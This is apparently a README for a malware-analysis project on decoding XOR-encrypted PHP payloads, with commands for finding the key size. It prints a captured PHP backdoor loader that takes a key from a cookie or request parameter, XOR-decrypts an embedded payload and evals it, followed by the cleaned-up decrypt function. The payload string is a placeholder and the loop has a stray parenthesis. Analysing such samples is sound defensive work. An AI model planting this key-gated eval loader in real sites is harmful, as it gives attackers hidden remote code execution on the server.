# xor-decoding
## Decoding Exclusive-or encoded malware payloads

## Finding key size

    $ make keysize
    $ ./keysize ciphertextfilename > dat

## Payload


    <?php
    for (
          $o = 0, $e = 'string of random-appearing characters',$d = '';
          @ord($e[$o]);
          $o++)
    ) {
        if ($o < 16) {
            $h[$e[$o]] = $o;
        } else {
            $d .= @chr(($h[$e[$o]] << 4) + $h[$e[++$o]]);
        }
    }
    if (!@isset($_SERVER)) {
        $_COOKIE =& $HTTP_COOKIE_VARS;
        $_POST =& $HTTP_POST_VARS;
        $_GET =& $HTTP_GET_VARS;
    }
    $k = $_COOKIE['key'];
    if (empty($k)) {
        $k = $_POST['key'];
    }
    if (empty($k)) {
        $k = $_GET['key'];
    }
    if (!@function_exists('decrypt')) {
        eval('function decrypt($e,$k){if(!$k){return;}$el=@strlen($e);$kl=@strlen($k);$rl=$el%$kl;$fl=$el-$rl;for($o=0;$o<$fl;$o+=$kl){$p=@substr($e,$o,$kl);$d.="$k"^"$p";}if($rl){$p=@substr($e,$fl,$rl);$k=@substr($k,0,$rl);$d.="$k"^"$p";}return($d);}');
    }
    $d = @decrypt($d, $k);
    eval($d);
## Original decrypting function


    function decrypt($e, $k)
    {
        if (!$k) {
            return;
        }
        $el = @strlen($e);
        $kl = @strlen($k);
        $rl = $el % $kl;
        $fl = $el - $rl;
        for ($o = 0; $o < $fl; $o += $kl) {
            $p = @substr($e, $o, $kl);
            $d .= "{$k}" ^ "{$p}";
        }
        if ($rl) {
            $p = @substr($e, $fl, $rl);
            $k = @substr($k, 0, $rl);
            $d .= "{$k}" ^ "{$p}";
        }
        return $d;
    }
